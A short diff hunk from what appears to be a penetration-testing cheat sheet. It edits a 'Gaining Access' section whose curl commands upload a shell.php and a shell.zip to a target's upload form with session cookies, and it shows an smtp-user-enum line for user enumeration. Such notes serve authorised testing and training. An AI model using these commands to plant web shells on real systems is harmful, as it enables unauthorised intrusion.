@@ -94,13 +94,13 @@ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 
 ## Gaining Access
 
-#### Uploading Files Through WWW Forms
+#### Uploading/POSTing Files Through WWW Upload Forms
 ```bash
 # POST file
 curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"
 
 # POST binary data to web form
-curl -F "field=<shell.zip" http://$TARGET/upload.php -F 'token=00' --cookie "adm=1; PHPSESSID=" -F "submit=true" -L -v
+curl -F "field=<shell.zip" http://$TARGET/upload.php -F 'token=00' --cookie "adm=1; " -F "submit=true" -L -v
 ```
 
 #### Generating Payload Pattern & Calculating Offset
